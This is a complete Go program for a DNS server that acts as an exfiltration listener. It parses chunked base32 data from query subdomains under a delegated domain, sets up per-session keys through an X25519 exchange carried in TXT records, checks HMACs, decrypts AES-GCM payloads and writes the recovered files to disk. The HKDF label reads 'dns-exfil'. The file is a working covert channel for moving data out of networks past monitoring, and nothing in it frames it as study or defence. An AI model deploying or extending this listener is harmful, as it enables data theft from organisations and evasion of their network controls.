package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base32"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
	"golang.org/x/crypto/hkdf"
)

const (
	defaultTTL      = 60
	cleanupInterval = time.Minute
	sessionTTL      = 10 * time.Minute
)

type sharedKey struct {
	aesKey  []byte
	hmacKey []byte
}

type rateLimitEntry struct {
	timestamps []time.Time
}

type Server struct {
	domain         string
	outputDir      string
	fragments      map[string]map[int]string
	lastSeen       map[string]time.Time
	sharedKeys     map[string]sharedKey
	serverPubkeys  map[string][]byte
	mu             sync.Mutex
	rateLimitMu    sync.Mutex
	ipRequests     map[string]*rateLimitEntry
	rateLimitWindow time.Duration
	rateLimitMax   int
}

func main() {
	port := flag.Int("port", 5300, "UDP port to listen on")
	domain := flag.String("domain", "xf.example.com", "Delegated DNS domain")
	outDir := flag.String("output-dir", "output", "Directory to write output files")
	rlWindow := flag.Int("rate-limit-window", 60, "Rate limit window in seconds")
	rlMax := flag.Int("rate-limit-max", 200, "Max requests per IP per window")
	flag.Parse()

	srv := &Server{
		domain:          *domain,
		outputDir:       *outDir,
		fragments:       make(map[string]map[int]string),
		lastSeen:        make(map[string]time.Time),
		sharedKeys:      make(map[string]sharedKey),
		serverPubkeys:   make(map[string][]byte),
		ipRequests:      make(map[string]*rateLimitEntry),
		rateLimitWindow: time.Duration(*rlWindow) * time.Second,
		rateLimitMax:    *rlMax,
	}

	go srv.cleanupStale()

	dns.HandleFunc(".", srv.ServeDNS)

	addr := fmt.Sprintf(":%d", *port)
	server := &dns.Server{Addr: addr, Net: "udp"}
	log.Printf("Listening on UDP/%d for domain %s...", *port, *domain)
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("DNS server failed: %v", err)
	}
}

// isRateLimited checks whether the given IP has exceeded the request limit.
func (s *Server) isRateLimited(ip string) bool {
	now := time.Now()
	s.rateLimitMu.Lock()
	defer s.rateLimitMu.Unlock()

	entry, ok := s.ipRequests[ip]
	if !ok {
		entry = &rateLimitEntry{}
		s.ipRequests[ip] = entry
	}

	// Prune old timestamps
	cutoff := now.Add(-s.rateLimitWindow)
	fresh := entry.timestamps[:0]
	for _, t := range entry.timestamps {
		if t.After(cutoff) {
			fresh = append(fresh, t)
		}
	}
	entry.timestamps = fresh

	if len(entry.timestamps) >= s.rateLimitMax {
		return true
	}
	entry.timestamps = append(entry.timestamps, now)
	return false
}

// ServeDNS handles incoming DNS requests.
func (s *Server) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		_ = w.WriteMsg(new(dns.Msg).SetRcode(r, dns.RcodeFormatError))
		return
	}

	// Rate limiting
	if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
		if s.isRateLimited(addr.IP.String()) {
			log.Printf("Rate limit exceeded for %s, dropping request", addr.IP)
			return
		}
	}

	q := r.Question[0]
	qname := strings.TrimSuffix(q.Name, ".")
	if !strings.HasSuffix(strings.ToLower(qname), strings.ToLower(s.domain)) {
		_ = w.WriteMsg(new(dns.Msg).SetRcode(r, dns.RcodeRefused))
		return
	}

	reply := new(dns.Msg)
	reply.SetReply(r)

	// Parse subdomain: <id>-<idx>-<total>-<payload>[.<more>...].<domain>
	prefix := qname[:len(qname)-len(s.domain)-1]
	parts := strings.SplitN(prefix, "-", 4)
	if len(parts) != 4 {
		return
	}
	id, idx, total, payload := parts[0], parts[1], parts[2], parts[3]

	if idx == "0" && total == "0" {
		// Key exchange: client sends pubkey via TXT query, server responds with TXT
		serverPubBytes := s.handleKeyExchange(id, payload)
		if serverPubBytes == nil {
			return
		}
		serverPubB32 := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(serverPubBytes)
		reply.Answer = append(reply.Answer, &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: []string{serverPubB32},
		})
	} else {
		// Data chunk
		s.handleDataChunk(id, idx, total, payload)
		reply.Answer = append(reply.Answer, &dns.A{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: defaultTTL},
			A:   net.ParseIP("192.0.2.1"),
		})
	}

	if err := w.WriteMsg(reply); err != nil {
		log.Printf("failed to write response for %s: %v", q.Name, err)
	}
}

// handleKeyExchange generates an ephemeral server keypair for this session,
// derives shared keys, and returns the server's ephemeral public key bytes.
// Idempotent: if session already has keys, returns cached server pubkey.
func (s *Server) handleKeyExchange(id, payload string) []byte {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Idempotent: return cached pubkey if session already established
	if pub, ok := s.serverPubkeys[id]; ok {
		return pub
	}

	// Join multi-label payload (dots from additional labels)
	b32 := strings.ReplaceAll(payload, ".", "")
	padded := padBase32String(b32)
	clientPubBytes, err := base32.StdEncoding.DecodeString(padded)
	if err != nil {
		log.Printf("[%s] Base32 decode failed: %v", id, err)
		return nil
	}

	// Generate ephemeral server keypair
	curve := ecdh.X25519()
	serverPriv, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		log.Printf("[%s] generate server key: %v", id, err)
		return nil
	}
	serverPubBytes := serverPriv.PublicKey().Bytes()

	// Derive shared keys
	aesKey, hmacKey, err := deriveSharedKey(serverPriv, clientPubBytes)
	if err != nil {
		log.Printf("[%s] deriveSharedKey error: %v", id, err)
		return nil
	}

	s.sharedKeys[id] = sharedKey{aesKey, hmacKey}
	s.serverPubkeys[id] = serverPubBytes
	s.lastSeen[id] = time.Now()
	log.Printf("[%s] Ephemeral session keys established", id)
	return serverPubBytes
}

// handleDataChunk stores chunk and processes when complete.
func (s *Server) handleDataChunk(id, idxStr, totalStr, fragment string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	idx := parseInt(idxStr)
	total := parseInt(totalStr)
	if s.fragments[id] == nil {
		s.fragments[id] = make(map[int]string)
	}
	s.fragments[id][idx] = fragment
	s.lastSeen[id] = time.Now()
	if len(s.fragments[id]) != total {
		return
	}

	// assemble fragments
	parts := make([]string, total)
	for i := 0; i < total; i++ {
		parts[i] = s.fragments[id][i]
	}
	b32 := strings.Join(parts, "")
	padded := padBase32String(b32)
	raw, err := base32.StdEncoding.DecodeString(padded)
	if err != nil {
		log.Printf("[%s] decode payload: %v", id, err)
		return
	}
	pl, tag := splitPayloadAndTag(raw)
	key := s.sharedKeys[id]
	if !verifyHMAC(pl, tag, key.hmacKey) {
		return
	}
	plaintext, err := decryptAESGCM(key.aesKey, pl)
	if err != nil {
		log.Printf("[%s] decryptAESGCM: %v", id, err)
		return
	}
	if err := os.MkdirAll(s.outputDir, 0o755); err != nil {
		log.Printf("mkdir %q: %v", s.outputDir, err)
	}
	filePath := fmt.Sprintf("%s/%s.bin", s.outputDir, id)
	if err := os.WriteFile(filePath, plaintext, 0o644); err != nil {
		log.Printf("write file: %v", err)
	} else {
		log.Printf("[%s] File written: %s", id, filePath)
	}
}

// deriveSharedKey performs ECDH and HKDF to produce AES and HMAC keys.
func deriveSharedKey(priv *ecdh.PrivateKey, clientPub []byte) ([]byte, []byte, error) {
	pubKey, err := ecdh.X25519().NewPublicKey(clientPub)
	if err != nil {
		return nil, nil, err
	}
	secret, err := priv.ECDH(pubKey)
	if err != nil {
		return nil, nil, err
	}
	reader := hkdf.New(sha256.New, secret, nil, []byte("dns-exfil"))
	material := make([]byte, 48)
	if _, err := io.ReadFull(reader, material); err != nil {
		return nil, nil, fmt.Errorf("hkdf expansion: %w", err)
	}
	return material[:32], material[32:], nil
}

// decryptAESGCM decrypts nonce||ciphertext+tag blob.
func decryptAESGCM(key, blob []byte) ([]byte, error) {
	if len(blob) < 12 {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, data := blob[:12], blob[12:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, data, nil)
}

// verifyHMAC checks payload integrity.
func verifyHMAC(payload, tag, key []byte) bool {
	expected := hmac.New(sha256.New, key)
	expected.Write(payload)
	if !hmac.Equal(expected.Sum(nil), tag) {
		log.Println("HMAC verification failed")
		return false
	}
	log.Println("HMAC verification succeeded")
	return true
}

// padBase32String adds '=' padding.
func padBase32String(s string) string {
	pad := (8 - len(s)%8) % 8
	return strings.ToUpper(s) + strings.Repeat("=", pad)
}

// splitPayloadAndTag separates raw bytes.
func splitPayloadAndTag(raw []byte) ([]byte, []byte) {
	n := len(raw)
	if n < 32 {
		return nil, nil
	}
	return raw[:n-32], raw[n-32:]
}

// parseInt is a helper for Atoi.
func parseInt(s string) int {
	i, _ := strconv.Atoi(s)
	return i
}

// cleanupStale periodically removes expired sessions.
func (s *Server) cleanupStale() {
	ticker := time.NewTicker(cleanupInterval)
	defer ticker.Stop()
	for range ticker.C {
		now := time.Now()
		s.mu.Lock()
		for id, ts := range s.lastSeen {
			if now.Sub(ts) > sessionTTL {
				delete(s.fragments, id)
				delete(s.sharedKeys, id)
				delete(s.serverPubkeys, id)
				delete(s.lastSeen, id)
				log.Printf("[%s] Session expired and cleaned up", id)
			}
		}
		s.mu.Unlock()
	}
}
